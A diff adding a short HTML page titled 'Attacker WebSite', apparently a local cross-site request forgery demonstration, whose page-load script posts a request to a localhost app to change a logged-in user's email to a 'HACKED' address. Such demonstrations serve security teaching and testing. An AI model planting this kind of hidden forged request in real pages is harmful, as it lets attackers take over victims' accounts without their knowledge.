@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attacker WebSite</title>
+  </head>
+
+  <body>
+    <div>
+      <h1>Some nice website</h1>
+    </div>
+    <script>
+      fetch('http://localhost:3333/login/edit', {
+        method: 'POST',
+        body: {
+          email: 'HACKED_sinqueteenteres@test.com',
+        },
+      })
+        .then((res) => res.text())
+        .then((text) => console.log(text))
+        .catch((err) => console.log(err));
+    </script>
+  </body>
+</html>
